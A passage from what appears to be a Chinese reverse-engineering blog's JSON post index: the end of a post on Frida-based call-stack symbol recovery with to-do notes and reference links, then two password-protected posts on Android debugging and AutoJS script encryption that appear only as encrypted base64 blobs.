xia0CallStackSymbols()接口可以传递一个bool参数，true为仅仅解析主模块的地址，false为所有模块都需要解析。实际在逆向过程中一般只需要主模块的符号信息，其他系统函数没很大必要。 遗留问题/Todo 在执行恢复符号的过程中时间相对较长，主要原因在于每一个地址都要和所有方法比较，这里建议xia0CallStackSymbols传入true，这样只解析主模块的地址。耗时的原因还在于每一个地址解析的时候都会去调用接口获取所有方法信息，实际上每个模块只需要一次就能拿到所有方法信息，接下来要做的就是优化相关代码，缓存模块的所有方法信息，下次解析的地址为该模块时直接去缓存里面匹配查找。 在匹配符号的过程中，判断是否为C函数需要更多的原则，3000的阈值需要后面再调下。 关于block的符号恢复，目前只有在lldb中实现了，下一步准备在xia0CallStackSymbols中也支持恢复block函数符号 题外话短视频下载去水印如果有人感兴趣的话，可以点这里，目前支持的有皮皮搞笑、抖音、皮皮虾、Tiktok 参考 https://github.com/poxyran/misc &lt; https://github.com/iddoeldor/frida-snippets &gt; http://www.blogfshare.com/ioss-validate-address.html https://jmpews.github.io/2017/08/09/darwin/%E5%8F%8D%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/ https://github.com/interference-security/frida-scripts https://github.com/dweinstein/awesome-frida https://www.frida.re/docs/javascript-api/","tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"},{"name":"frida","slug":"frida","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/frida/"}]},{"title":"android调试深度总结","date":"2019-06-04T14:54:21.000Z","path":"2019/06/04/andoid-debug-note/andoid-debug-note/","text":"Need password to decrypt! Incorrect Password! No content to display! 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","tags":[{"name":"Android","slug":"Android","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Android/"},{"name":"debug","slug":"debug","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/debug/"}]},{"title":"Android AutoJS 脚本加密分析","date":"2019-04-25T07:12:09.000Z","path":"2019/04/25/autojs加密分析/autojs加密分析/","text":"show me the code Incorrect Password! No content to display! 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